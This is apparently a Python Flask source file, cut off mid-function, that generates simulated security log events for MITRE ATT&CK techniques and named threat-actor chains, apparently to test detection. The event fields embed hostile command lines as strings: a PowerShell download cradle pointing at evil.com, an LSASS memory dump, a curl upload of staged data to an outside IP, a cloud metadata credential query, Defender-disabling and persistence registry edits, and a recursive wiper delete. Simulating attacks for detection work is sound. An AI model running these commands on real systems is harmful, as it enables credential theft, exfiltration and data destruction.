import os
import json
import random
import string
import time
from datetime import datetime, timezone
import requests
from flask import Flask, request, jsonify, render_template
import hashlib

# Optional psutil import
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("Warning: 'psutil' library not found. Using random PIDs.")

app = Flask(__name__)

# --- Configuration ---
FORCED_VENDOR = "Thinkinfosec"
TIMEZONE_STR = "UTC"
APP_TITLE = "Sample Log Kit Shipper - SLK Shipper" # New Title

# --- Log Generation Helper Functions ---
def get_utc_timestamp():
    """Generates a UTC timestamp string in ISO format with Z."""
    return datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%fZ')

def generate_fake_hash(algo='sha256', content=None):
    """Generates a fake hash string."""
    if content is None: content = os.urandom(16)
    if algo == 'md5': return hashlib.md5(content).hexdigest()
    if algo == 'sha1': return hashlib.sha1(content).hexdigest()
    return hashlib.sha256(content).hexdigest()

def get_base_event(category=["other"], type=["info"], outcome="unknown", os_family="windows"):
    """Creates the base structure with common fields and overrides."""
    now_iso = get_utc_timestamp()
    is_linux = os_family.lower() == "linux"
    if is_linux:
        hostname, os_name, os_version = f"sim-lnx-srv-{random.randint(10, 99)}", "Ubuntu", "22.04"; default_user, user_domain = random.choice(["admin", "devuser", "www-data", "root"]), None; host_ip = f"10.{random.randint(10,30)}.{random.randint(0,255)}.{random.randint(10,250)}"
    else:
        hostname, os_name, os_version = f"sim-win-wkstn-{random.randint(100, 999)}", "Windows 10 Enterprise", "10.0.19045"; default_user, user_domain = random.choice(["j.doe", "a.smith", "svc_backup", "testadmin"]), "SIMCORP"; host_ip = f"192.168.{random.randint(1,20)}.{random.randint(50, 200)}"
    base = {
        "@timestamp": now_iso, "vendor": FORCED_VENDOR,
        "event": { "created": now_iso, "provider": "AttackSimChain", "kind": "event", "category": category, "type": type, "outcome": outcome, "timezone": TIMEZONE_STR, "action": "", "module": "" },
        "observer": { "vendor": "SimulatedInfrastructure", "product": "AttackSimulatorTool", "type": "simulator", "hostname": "log-shipper-sim-01" },
        "agent": { "type": "flask-logshipper", "version": "1.5" }, # Incremented version
        "host": { "name": hostname, "hostname": hostname, "os": {"family": os_family, "name": os_name, "version": os_version, "platform": os_family}, "ip": [host_ip], "mac": [f"0A:1B:2C:{random.choice(string.hexdigits)}{random.choice(string.hexdigits)}:{random.choice(string.hexdigits)}{random.choice(string.hexdigits)}:{random.choice(string.hexdigits)}{random.choice(string.hexdigits)}"] },
        "user": { "name": default_user, "domain": user_domain },
        "log": {}, "related": {}, "tags": [], "product": "Windows" if not is_linux else "Linux", "service": "System"
    }
    if base["user"]["domain"] is None: del base["user"]["domain"]
    return base

def get_lsass_pid():
    if PSUTIL_AVAILABLE:
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == 'lsass.exe': return proc.info['pid']
        except (psutil.NoSuchProcess, psutil.AccessDenied, Exception): pass
    return random.randint(500, 1000)

# --- Individual TTP Generation Functions ---

# --- NEW: Phishing Email Received ---
def generate_t1566_phishing_received(recipient_user="a.hacker"):
    """Simulate Initial Access: Phishing Email Received (T1566.001/.002)"""
    event = get_base_event(category=["email"], type=["received", "info"], outcome="success", os_family="windows") # Category: email
    sender_domain = random.choice(["suspicious-mailer.com", "invoice-online.net", "hr-benefits-update.org"])
    subject = random.choice(["Urgent Invoice Payment Required", "Action Required: Verify Your Account", "Company Policy Update FY25"])
    attachment_name = random.choice(["Invoice_12345.pdf.lnk", "document.docm", "SecurePDF_Viewer.zip"])
    attachment_hash = generate_fake_hash()

    event["event"]["action"] = "email_received"
    event["email"] = {
        "message_id": f"<{random.randint(1000,9999)}{''.join(random.choices(string.ascii_lowercase, k=10))}@{sender_domain}>",
        "from": {"address": f"support@{sender_domain}"},
        "to": [{"address": f"{recipient_user}@simcorp.com"}], # Assume company email
        "subject": subject,
        "direction": "inbound",
        "attachments": [{
            "file": {
                "name": attachment_name,
                "size": random.randint(50*1024, 500*1024), # 50KB - 500KB
                "extension": attachment_name.split('.')[-1],
                "mime_type": "application/octet-stream", # Generic type
                "hash": {"sha256": attachment_hash }
            }
        }]
    }
    event["url"] = { # Optional: Simulate link in email body
         "original": f"http://phish-link-domain.xyz/verify?id={random.randbytes(8).hex()}"
    }
    event["user"]["name"] = recipient_user # User receiving the email
    event["host"] = None # Remove host info - email server event typically
    event["process"] = None # Remove process info
    event["product"], event["service"] = "Email Gateway", "smtp" # Simulate email system log
    event["tags"] = ["attack.initial_access", "attack.t1566"]
    event["log"] = {"level": "information"}
    # Clean up unused base fields
    if event.get("host"): del event["host"]
    if event.get("process"): del event["process"]
    return event

# --- NEW: Failed Login ---
def generate_t1110_failed_login(target_user="administrator", source_ip=None):
    """Simulate Credential Access: Brute Force/Password Spraying Failed Login (T1110)"""
    event = get_base_event(category=["authentication"], type=["start"], outcome="failure", os_family="windows") # Category: authentication
    source_ip = source_ip or f"11.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}" # Default external source

    event["event"]["action"] = "user_login_failed"
    event["source"] = {"ip": source_ip, "user": {"name": target_user}} # Attacker source IP, user they tried
    event["destination"] = {"ip": event["host"]["ip"][0], "port": random.choice([3389, 445, 22])} # Target machine IP/port
    event["user"]["name"] = target_user # User account targeted
    event["host"]["os"]["family"] = "windows" if event["destination"]["port"] != 22 else "linux" # Adjust OS based on port
    event["log"] = {"level": "warning"}
    event["product"], event["service"] = "Windows" if event["host"]["os"]["family"] == "windows" else "Linux", "Security" if event["host"]["os"]["family"] == "windows" else "sshd"
    event["tags"] = ["attack.credential_access", "attack.t1110"]
    if source_ip.startswith("11."): event["tags"].append("external_source") # Example tag
    # Clean up unused fields
    if event.get("process"): del event["process"]
    return event

# --- UPDATED: LSASS Dump ---
def generate_t1003_001_lsass_dump(user="SYSTEM", source_process_path=r"C:\Windows\System32\rundll32.exe"):
    """Simulate Credential Access: LSASS Memory (T1003.001)"""
    # Added "authentication" to category list
    event = get_base_event(category=["process", "intrusion_detection", "authentication"], type=["access", "info"], outcome="success", os_family="windows")
    lsass_pid, source_process_pid = get_lsass_pid(), random.randint(3000, 9000)
    source_process_name = os.path.basename(source_process_path)
    dump_file = f"C:\\Windows\\Temp\\lsass_{source_process_pid}.dmp"
    if "procdump.exe" in source_process_name: command_line = f'"{source_process_path}" -accepteula -ma {lsass_pid} {dump_file}'
    elif "rundll32.exe" in source_process_name: command_line = f'"{source_process_path}" C:\\windows\\System32\\comsvcs.dll, MiniDump {lsass_pid} {dump_file} full'
    else: command_line = f'"{source_process_path}" command_to_dump_lsass'
    event["event"]["action"] = "process_access"
    event["process"] = { "pid": source_process_pid, "name": source_process_name, "executable": source_process_path, "executable_name": source_process_name, "command_line": command_line }
    event["source"] = { "process": event["process"] }
    event["destination"] = { "process": { "pid": lsass_pid, "name": "lsass.exe", "executable": r"C:\Windows\System32\lsass.exe"} }
    event["user"]["name"] = user
    event["product"], event["service"] = "Sysmon", "sysmon"
    event["log"]["level"] = "critical"
    event["rule"] = {"id": "10", "name": "ProcessAccess"}
    event["tags"] = ["attack.credential_access", "attack.t1003", "attack.t1003.001"]
    event["related"] = {"user": [user]}
    return event

# --- Other TTP Functions (generate_t1059_001_powershell, etc.) ---
def generate_t1059_001_powershell(user="a.hacker", parent_process_path=r"C:\Windows\explorer.exe"):
    event = get_base_event(category=["process"], type=["start", "process_started"], outcome="success", os_family="windows")
    executable_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"; cmd = random.choice([ f'{executable_path} -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://evil.com/payload.ps1\'))"', f'{executable_path} -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACAARgByAG8AbQAgAEIAYQBzAGUANgA0ACc='])
    pid, parent_pid = random.randint(3000, 9000), random.randint(1000, 9000); executable_name = os.path.basename(executable_path); parent_executable_name = os.path.basename(parent_process_path) if parent_process_path else "unknown"
    event["event"]["action"] = "process_creation"
    event["process"] = { "pid": pid, "name": executable_name, "executable": executable_path, "executable_name": executable_name, "command_line": cmd, "parent": { "pid": parent_pid, "name": parent_executable_name, "executable": parent_process_path, "executable_name": parent_executable_name, "entity_id": f"{{{random.randbytes(16).hex()}}}"}, "entity_id": f"{{{random.randbytes(16).hex()}}}", "hash": { "md5": generate_fake_hash('md5', executable_path.encode()), "sha256": generate_fake_hash('sha256', executable_path.encode()) } }
    event["user"]["name"] = user; event["product"], event["service"] = "Sysmon", "sysmon"; event["rule"] = {"id": "1", "name": "ProcessCreate"}; event["tags"] = ["attack.execution", "attack.t1059", "attack.t1059.001"]
    return event
def generate_t1059_003_linux_shell(user="devuser", parent_process_path="/usr/sbin/sshd"):
    event = get_base_event(category=["process"], type=["start", "process_started"], outcome="success", os_family="linux")
    shell_path = random.choice(["/bin/bash", "/bin/sh"]); command = random.choice(['whoami', 'id', 'uname -a', 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/']); executable_path = f"/usr/bin/{command.split()[0]}" if not command.startswith('curl') else "/usr/bin/curl"
    pid, parent_pid, shell_pid = random.randint(10000, 20000), random.randint(1000, 9000), random.randint(9000, 10000); executable_name = os.path.basename(executable_path)
    event["event"]["action"] = "process_creation"
    event["process"] = { "pid": pid, "name": executable_name, "executable": executable_path, "executable_name": executable_name, "command_line": command, "parent": { "pid": shell_pid, "name": os.path.basename(shell_path), "executable": shell_path, "executable_name": os.path.basename(shell_path)}, "uid": 1000 if user != "root" else 0, "gid": 1000 if user != "root" else 0, "hash": { "md5": generate_fake_hash('md5', executable_path.encode()), "sha256": generate_fake_hash('sha256', executable_path.encode()) } }
    event["user"] = { "name": user, "id": str(event["process"]["uid"]), "group": {"id": str(event["process"]["gid"]), "name": user if user != "root" else "root"} }; event["product"], event["service"] = "Linux", "Auditd"; event["tags"] = ["attack.execution", "attack.t1059", "attack.t1059.003", "linux"]
    if "169.254.169.254" in command: event["event"]["category"].append("network"); event["destination"] = {"ip": "169.254.169.254", "port": 80}; event["source"] = {"ip": event["host"]["ip"][0], "port": random.randint(30000, 60000)}; event["network"] = {"protocol": "http", "transport": "tcp", "iana_number": 6, "direction": "outbound"}; event["tags"].extend(["attack.credential_access", "attack.t1552.005"])
    return event
def generate_t1057_tasklist(user="a.hacker", parent_process_path=r"C:\Windows\System32\cmd.exe"):
    event = get_base_event(category=["process"], type=["start", "process_started"], outcome="success", os_family="windows")
    executable_path = r"C:\Windows\System32\tasklist.exe"; cmd = f'{executable_path} /v'
    pid, parent_pid = random.randint(3000, 9000), random.randint(1000, 9000); executable_name = os.path.basename(executable_path); parent_executable_name = os.path.basename(parent_process_path) if parent_process_path else "unknown"
    event["event"]["action"] = "process_creation"
    event["process"] = { "pid": pid, "name": executable_name, "executable": executable_path, "executable_name": executable_name, "command_line": cmd, "parent": { "pid": parent_pid, "name": parent_executable_name, "executable": parent_process_path, "executable_name": parent_executable_name }, "entity_id": f"{{{random.randbytes(16).hex()}}}", "parent": {"entity_id": f"{{{random.randbytes(16).hex()}}}"}, "hash": { "sha256": generate_fake_hash('sha256', executable_path.encode()) } }
    event["user"]["name"] = user; event["product"], event["service"] = "Sysmon", "sysmon"; event["rule"] = {"id": "1", "name": "ProcessCreate"}; event["tags"] = ["attack.discovery", "attack.t1057"]
    return event
def generate_t1547_001_registry(user="a.hacker", source_process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"):
    event = get_base_event(category=["registry"], type=["creation", "change"], outcome="success", os_family="windows")
    reg_path = random.choice([r"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", r"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\BackupUtil"]); reg_value = r"C:\\Users\\Public\\payload.exe"
    pid = random.randint(3000, 9000); source_process_name = os.path.basename(source_process_path)
    try: reg_key_path, reg_value_name = reg_path.rsplit('\\', 1)
    except ValueError: reg_key_path, reg_value_name = reg_path, ""
    if "powershell.exe" in source_process_name: command_line_str = f'powershell.exe Set-ItemProperty -Path \'{reg_key_path}\' -Name \'{reg_value_name}\' -Value \'{reg_value}\''
    else: command_line_str = f'reg add "{reg_key_path}" /v "{reg_value_name}" /t REG_SZ /d "{reg_value}" /f'
    event["event"]["action"] = "registry_key_value_created"
    event["registry"] = { "path": reg_path, "hive": reg_path.split('\\')[0], "key": '\\'.join(reg_path.split('\\')[1:]), "value": reg_value_name, "data": {"type": "string", "strings": [reg_value]} }; event["process"] = { "pid": pid, "name": source_process_name, "executable": source_process_path, "executable_name": source_process_name, "command_line": command_line_str }
    event["user"]["name"] = user if "HKCU" in reg_path else "SYSTEM"; event["product"], event["service"] = "Sysmon", "sysmon"; event["rule"] = {"id": "13", "name": "RegistryEvent (Value Set)"}; event["tags"] = ["attack.persistence", "attack.defense_evasion", "attack.t1547", "attack.t1547.001"]
    return event
def generate_t1114_001_email_collection(user="a.hacker", parent_process_path=r"C:\Windows\System32\cmd.exe"):
    event = get_base_event(category=["process", "file"], type=["start", "access"], outcome="success", os_family="windows")
    target_path = random.choice([r"C:\Users\{user}\AppData\Local\Microsoft\Outlook\*.pst", r"C:\Users\{user}\Documents\Outlook Files\archive.pst"]).format(user=user); executable_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    ps_script_block = f"Get-ChildItem -Path '{os.path.dirname(target_path)}' -Filter '{os.path.basename(target_path)}' -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination C:\\Users\\Public\\staging\\"
    command_line_str = f'{executable_path} -Command "{ps_script_block}"'; pid, parent_pid = random.randint(3000, 9000), random.randint(1000, 9000); executable_name = os.path.basename(executable_path); parent_executable_name = os.path.basename(parent_process_path) if parent_process_path else "unknown"
    event["event"]["action"] = "file_access"
    event["process"] = { "pid": pid, "name": executable_name, "executable": executable_path, "executable_name": executable_name, "command_line": command_line_str, "parent": { "pid": parent_pid, "name": parent_executable_name, "executable": parent_process_path, "executable_name": parent_executable_name }, "hash": { "sha256": generate_fake_hash('sha256', executable_path.encode()) } }
    event["file"] = { "path": target_path, "name": os.path.basename(target_path), "directory": os.path.dirname(target_path), "extension": "pst" }; event["user"]["name"] = user; event["product"], event["service"] = "Sysmon", "sysmon"; event["rule"] = {"id": "1", "name": "ProcessCreate"}; event["tags"] = ["attack.collection", "attack.t1114", "attack.t1114.001"]
    return event
def generate_t1048_003_http_exfil(user="a.hacker", source_process_path=r"C:\Program Files\curl\curl.exe", data_size_mb=15):
    event = get_base_event(category=["network", "process"], type=["connection", "info", "start"], outcome="success", os_family="windows")
    dest_ip = random.choice(["1.2.3.4", "5.6.7.8", "9.10.11.12"]); bytes_sent, bytes_received = data_size_mb * 1024 * 1024 + random.randint(-1024*1024, 1024*1024), random.randint(100, 1000)
    pid, parent_pid = random.randint(3000, 9000), random.randint(1000, 9000); executable_name = os.path.basename(source_process_path)
    event["event"]["action"] = "network_flow"
    event["source"] = {"ip": event["host"]["ip"][0], "port": random.randint(49152, 65535), "bytes": bytes_received}; event["destination"] = {"ip": dest_ip, "port": 80, "bytes": bytes_sent}
    event["network"] = { "transport": "tcp", "protocol": "http", "iana_number": 6, "direction": "outbound", "bytes": bytes_sent + bytes_received, "community_id": f"1:{''.join(random.choices(string.ascii_letters + string.digits, k=20))}" }; event["url"] = { "original": f"http://{dest_ip}/upload_data.php", "path": "/upload_data.php", "domain": f"c2-dropzone-{random.randint(1,10)}.net" }; event["http"] = { "request": {"method": "post", "bytes": bytes_sent}, "response": {"status_code": 200, "bytes": bytes_received} }
    event["process"] = { "pid": pid, "name": executable_name, "executable": source_process_path, "executable_name": executable_name, "command_line": f'"{source_process_path}" -X POST --data-binary @staged_data.zip http://{dest_ip}/upload_data.php', "parent": {"pid": parent_pid, "name": "cmd.exe"}, "hash": { "md5": generate_fake_hash('md5', source_process_path.encode()), "sha256": generate_fake_hash('sha256', source_process_path.encode()) } }
    event["user"]["name"] = user; event["product"], event["service"] = "Firewall", "network_traffic"; event["log"] = {"level": "warning"}; event["related"] = {"ip": [event["host"]["ip"][0], dest_ip]}; event["tags"] = ["attack.exfiltration", "attack.t1048", "attack.t1048.003", "Command and Control"]
    return event
def generate_t1112_modify_registry_defender(user="SYSTEM", source_process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"):
    event = get_base_event(category=["registry", "malware"], type=["change", "creation"], outcome="success", os_family="windows")
    reg_path, reg_value = r"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware", "1"; pid = random.randint(3000, 9000); source_process_name = os.path.basename(source_process_path)
    try: reg_key_path_only, reg_value_name_only = reg_path.rsplit('\\', 1)
    except ValueError: reg_key_path_only, reg_value_name_only = reg_path, ""
    if "powershell.exe" in source_process_name: command_line_str = f'powershell.exe Set-ItemProperty -Path \'{reg_key_path_only}\' -Name \'{reg_value_name_only}\' -Value {reg_value}'
    else: command_line_str = f'reg add "{reg_key_path_only}" /v "{reg_value_name_only}" /t REG_DWORD /d {reg_value} /f'
    event["event"]["action"] = "registry_key_modified"
    event["registry"] = { "path": reg_path, "hive": "HKLM", "key": reg_key_path_only.replace("HKLM\\\\",""), "value": reg_value_name_only, "data": {"type": "dword", "strings": [reg_value]} }; event["process"] = { "pid": pid, "name": source_process_name, "executable": source_process_path, "executable_name": source_process_name, "command_line": command_line_str }
    event["user"]["name"] = user; event["product"], event["service"] = "Sysmon", "sysmon"; event["log"]["level"] = "warning"; event["rule"] = {"id": "13", "name": "RegistryEvent (Value Set)"}; event["tags"] = ["attack.defense_evasion", "attack.t1112"]
    return event
def generate_t1021_002_smb_access(user="SIMCORP\\admin_user", source_process_path=r"C:\Windows\explorer.exe"):
    event = get_base_event(category=["network"], type=["connection", "start"], outcome="success", os_family="windows")
    dest_ip = f"192.168.{random.randint(1,20)}.{random.randint(10, 49)}"; dest_hostname = f"target-dc-{random.randint(1,3)}"; pid, parent_pid = random.randint(3000, 9000), random.randint(1000, 9000); source_process_name = os.path.basename(source_process_path)
    event["event"]["action"] = "network_connection_attempted"
    event["source"] = {"ip": event["host"]["ip"][0], "port": random.randint(49152, 65535)}; event["destination"] = {"ip": dest_ip, "port": 445, "domain": f"{dest_hostname}.simcorp"}; event["network"] = {"transport": "tcp", "protocol": "smb", "iana_number": 6, "direction": "outbound"}
    event["process"] = { "pid": pid, "name": source_process_name, "executable": source_process_path, "executable_name": source_process_name, "parent": {"pid": parent_pid}}
    event["user"]["name"] = user; event["product"], event["service"] = "Windows", "Security"; event["log"] = {"level": "information"}; event["related"] = {"ip": [event["host"]["ip"][0], dest_ip], "user": [user]}; event["tags"] = ["attack.lateral_movement", "attack.t1021", "attack.t1021.002"]
    return event
def generate_t1074_001_staging(user="a.hacker", parent_process_path=r"C:\Windows\System32\cmd.exe"):
    event = get_base_event(category=["process", "file"], type=["start", "creation"], outcome="success", os_family="windows")
    source_dir = random.choice([r"C:\Users\j.doe\Documents", r"C:\ProjectData\Secret", r"C:\Users\a.smith\Desktop"]); staging_dir, archive_name = r"C:\Users\Public\staging", f"archive_{random.randint(1000,9999)}.zip"; archive_path = f"{staging_dir}\\{archive_name}"; executable_path = r"C:\Program Files\7-Zip\7z.exe"
    pid, parent_pid = random.randint(3000, 9000), random.randint(1000, 9000); executable_name = os.path.basename(executable_path); parent_executable_name = os.path.basename(parent_process_path) if parent_process_path else "unknown"; command_line_str = f'"{executable_path}" a "{archive_path}" "{source_dir}\\*"'
    event["event"]["action"] = "file_creation"
    event["process"] = { "pid": pid, "name": executable_name, "executable": executable_path, "executable_name": executable_name, "command_line": command_line_str, "parent": { "pid": parent_pid, "name": parent_executable_name, "executable": parent_process_path, "executable_name": parent_executable_name }, "hash": { "sha256": generate_fake_hash('sha256', executable_path.encode()) } }
    event["file"] = { "path": archive_path, "name": archive_name, "directory": staging_dir, "extension": "zip", "type": "archive", "size": random.randint(10*1024*1024, 100*1024*1024) }; event["user"]["name"] = user; event["product"], event["service"] = "Sysmon", "sysmon"; event["rule"] = {"id": "11", "name": "FileCreate"}; event["tags"] = ["attack.collection", "attack.t1074", "attack.t1074.001"]
    return event
def generate_t1053_005_scheduled_task(user="SYSTEM", source_process_path=r"C:\Windows\System32\svchost.exe"):
    event = get_base_event(category=["process", "scheduled_job"], type=["creation", "start"], outcome="success", os_family="windows")
    task_name, payload_path = f"SystemUpdateTask_{random.randint(1000,9999)}", r"C:\Users\Public\payload.exe"; executable_path = r"C:\Windows\System32\schtasks.exe"
    pid, parent_pid = random.randint(3000, 9000), random.randint(1000, 9000); executable_name = os.path.basename(executable_path); parent_executable_name = os.path.basename(source_process_path) if source_process_path else "unknown"; command_line_str = f'schtasks.exe /create /tn "{task_name}" /tr "{payload_path}" /sc ONLOGON /ru SYSTEM /f'
    event["event"]["action"] = "scheduled_task_created"
    event["process"] = { "pid": pid, "name": executable_name, "executable": executable_path, "executable_name": executable_name, "command_line": command_line_str, "parent": { "pid": parent_pid, "name": parent_executable_name, "executable": source_process_path, "executable_name": parent_executable_name }, "hash": { "sha256": generate_fake_hash('sha256', executable_path.encode()) } }
    event["task"] = { "name": task_name, "action": payload_path, "type": "scheduled" }; event["user"]["name"] = user; event["product"], event["service"] = "Windows", "TaskScheduler"; event["log"]["level"] = "information"; event["tags"] = ["attack.persistence", "attack.execution", "attack.privilege_escalation", "attack.t1053", "attack.t1053.005"]
    return event
def generate_t1135_net_share_discovery(user="a.hacker", source_process_path=r"C:\Windows\System32\cmd.exe"):
    event = get_base_event(category=["process"], type=["start"], outcome="success", os_family="windows")
    executable_path = r"C:\Windows\System32\net1.exe"; pid, parent_pid = random.randint(3000, 9000), random.randint(1000, 9000); executable_name = os.path.basename(executable_path); parent_executable_name = os.path.basename(source_process_path) if source_process_path else "unknown"; command_line_str = random.choice(['net view', 'net view /domain:SIMCORP'])
    event["event"]["action"] = "process_creation"
    event["process"] = { "pid": pid, "name": executable_name, "executable": executable_path, "executable_name": executable_name, "command_line": command_line_str, "parent": { "pid": parent_pid, "name": parent_executable_name, "executable": source_process_path, "executable_name": parent_executable_name }, "hash": { "sha256": generate_fake_hash('sha256', executable_path.encode()) } }
    event["user"]["name"] = user; event["product"], event["service"] = "Sysmon", "sysmon"; event["log"]["level"] = "information"; event["tags"] = ["attack.discovery", "attack.t1135"]
    return event

# --- ATT&CK Chain Generation Functions (with new TTPs integrated) ---

def generate_chain1_email_exfil():
    """Chain: Phishing Email -> PS Download -> Email Discovery -> Staging -> HTTP Exfil"""
    events = []; attacker_user = f"user{random.randint(10,99)}"
    events.append(generate_t1566_phishing_received(recipient_user=attacker_user)) # Start with phishing email
    events.append(generate_t1059_001_powershell(user=attacker_user, parent_process_path=r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"))
    events.append(generate_t1114_001_email_collection(user=attacker_user))
    events.append(generate_t1074_001_staging(user=attacker_user))
    events.append(generate_t1048_003_http_exfil(user=attacker_user, data_size_mb=random.randint(20, 80)))
    return events

def generate_chain4_linux_metadata_curl():
    """Chain: Simulate SSH login -> Shell -> Curl Metadata Service"""
    events = []; user = random.choice(['devadmin', 'ec2-user', 'ubuntu'])
    events.append(generate_t1059_003_linux_shell(user=user, parent_process_path="/bin/bash"))
    return events

def generate_chain_fin7():
    """ Chain: Phishing Email -> PS Download -> Proc Discovery -> Failed Login -> SMB Access -> Remote PS Exec -> RegKey Persistence"""
    events = []; user, admin_user = f"finance_user_{random.randint(10,99)}", "SIMCORP\\domain_admin_comp"
    target_host, target_hostname = f"192.168.{random.randint(1,20)}.{random.randint(100, 200)}", f"POS_TERMINAL_{random.randint(1,5)}"
    events.append(generate_t1566_phishing_received(recipient_user=user)) # Phishing initial access
    events.append(generate_t1059_001_powershell(user=user, parent_process_path=r"C:\Windows\explorer.exe"))
    events.append(generate_t1057_tasklist(user=user, parent_process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"))
    events.append(generate_t1110_failed_login(target_user="administrator")) # Failed login attempt first
    smb_event = generate_t1021_002_smb_access(user=admin_user, source_process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")
    smb_event["destination"].update({"ip": target_host, "domain": target_hostname}); events.append(smb_event)
    remote_exec_event = generate_t1059_001_powershell(user=admin_user, parent_process_path=r"C:\Windows\System32\services.exe")
    remote_exec_event["host"].update({"ip": [target_host], "name": target_hostname, "hostname": target_hostname}); remote_exec_event["process"]["command_line"] += " # Stage 2 on POS"; remote_exec_event["tags"].append("attack.remote_execution"); events.append(remote_exec_event)
    reg_event = generate_t1547_001_registry(user="SYSTEM", source_process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")
    reg_event["host"].update({"ip": [target_host], "name": target_hostname, "hostname": target_hostname}); reg_event["registry"]["path"], reg_event["registry"]["value"] = r"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\POSMalwareLoader", r"C:\Windows\Temp\pos_malware.exe"; events.append(reg_event)
    return events

def generate_chain_apt29():
    """ Chain: Phishing -> PS Execution -> Defense Evasion (AV RegKey) -> Staging -> Scheduled Task Persistence -> HTTP Exfil """
    events = []; user, system_user = f"gov_employee_{random.randint(1,10)}", "NT AUTHORITY\\SYSTEM"
    events.append(generate_t1566_phishing_received(recipient_user=user)) # Start with phishing
    events.append(generate_t1059_001_powershell(user=user, parent_process_path=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"))
    events.append(generate_t1112_modify_registry_defender(user=system_user, source_process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"))
    events.append(generate_t1074_001_staging(user=user))
    events.append(generate_t1053_005_scheduled_task(user=system_user))
    events.append(generate_t1048_003_http_exfil(user=user, data_size_mb=random.randint(5, 25)))
    return events

def generate_chain_apt28():
    """ Chain: PS Exec -> LSASS Dump -> Failed Login -> Network Share Discovery -> SMB Access -> Remote PS Exec """
    events = []; user, system_user, compromised_admin = f"journalist_{random.randint(1,5)}", "NT AUTHORITY\\SYSTEM", "SIMCORP\\it_admin_comp"
    target_host, target_hostname = f"192.168.{random.randint(1,20)}.{random.randint(50, 99)}", f"FILE_SERVER_{random.randint(1,3)}"
    events.append(generate_t1059_001_powershell(user=user, parent_process_path=r"C:\Windows\explorer.exe"))
    events.append(generate_t1003_001_lsass_dump(user=system_user, source_process_path=r"C:\Windows\System32\rundll32.exe"))
    events.append(generate_t1110_failed_login(target_user=compromised_admin.split('\\')[1])) # Simulate failed login before success
    events.append(generate_t1135_net_share_discovery(user=compromised_admin, source_process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"))
    smb_event = generate_t1021_002_smb_access(user=compromised_admin, source_process_path=r"C:\Windows\explorer.exe"); smb_event["destination"].update({"ip": target_host, "domain": target_hostname}); events.append(smb_event)
    remote_exec_event = generate_t1059_001_powershell(user=compromised_admin, parent_process_path=r"C:\Windows\System32\services.exe")
    remote_exec_event["host"].update({"ip": [target_host], "name": target_hostname, "hostname": target_hostname}); remote_exec_event["process"]["command_line"] += " # APT28 Remote Access"; remote_exec_event["tags"].append("attack.remote_execution"); events.append(remote_exec_event)
    return events

def generate_chain_lazarus():
    """ Chain: PS Exec -> Defense Evasion (Reg) -> Failed Login -> SMB Access -> Remote Exec (Wiper Sim) -> Impact """
    events = []; user, system_user, compromised_admin = f"finance_target_{random.randint(1,10)}", "NT AUTHORITY\\SYSTEM", "SIMCORP\\admin_backup_comp"
    target_host, target_hostname = f"192.168.{random.randint(1,20)}.{random.randint(10, 50)}", f"BACKUP_SERVER_{random.randint(1,2)}"
    events.append(generate_t1059_001_powershell(user=user, parent_process_path=r"C:\Windows\explorer.exe"))
    events.append(generate_t1112_modify_registry_defender(user=system_user, source_process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"))
    events.append(generate_t1110_failed_login(target_user=compromised_admin.split('\\')[1], source_ip=events[0]["host"]["ip"][0])) # Failed login from initial host
    smb_event = generate_t1021_002_smb_access(user=compromised_admin); smb_event["destination"].update({"ip": target_host, "domain": target_hostname}); events.append(smb_event)
    remote_exec_event = generate_t1059_001_powershell(user=compromised_admin, parent_process_path=r"C:\Windows\System32\services.exe")
    remote_exec_event["host"].update({"ip": [target_host], "name": target_hostname, "hostname": target_hostname})
    remote_exec_event["process"]["command_line"] = r'powershell.exe -Command "Remove-Item -Path C:\* -Recurse -Force -ErrorAction SilentlyContinue # WIPER SIMULATION"'
    remote_exec_event["event"]["outcome"] = random.choice(["success", "failure"]); remote_exec_event["log"]["level"] = "critical"; remote_exec_event["tags"].extend(["attack.impact", "attack.t1485", "attack.remote_execution"]); events.append(remote_exec_event)
    return events

def generate_chain_wizard_spider():
    """ Chain: PS Exec -> Proc Discovery -> LSASS Dump -> Failed Login -> SMB Access -> Remote PS Exec (Ransomware Sim) -> Impact """
    events = []; user, system_user, compromised_admin = f"user_{random.randint(100,999)}", "NT AUTHORITY\\SYSTEM", "SIMCORP\\Domain Admins"
    target_host, target_hostname = f"192.168.{random.randint(1,20)}.{random.randint(150, 200)}", f"WS_{random.randint(1000,2000)}"
    events.append(generate_t1059_001_powershell(user=user, parent_process_path=r"C:\Windows\explorer.exe"))
    events.append(generate_t1057_tasklist(user=user, parent_process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"))
    events.append(generate_t1003_001_lsass_dump(user=system_user))
    events.append(generate_t1110_failed_login(target_user="administrator")) # Failed login spray attempt
    smb_event = generate_t1021_002_smb_access(user=compromised_admin); smb_event["destination"].update({"ip": target_host, "domain": target_hostname}); events.append(smb_event)
    remote_exec_event = generate_t1059_001_powershell(user=compromised_admin, parent_process_path=r"C:\Windows\System32\services.exe")
    remote_exec_event["host"].update({"ip": [target_host], "name": target_hostname, "hostname": target_hostname})
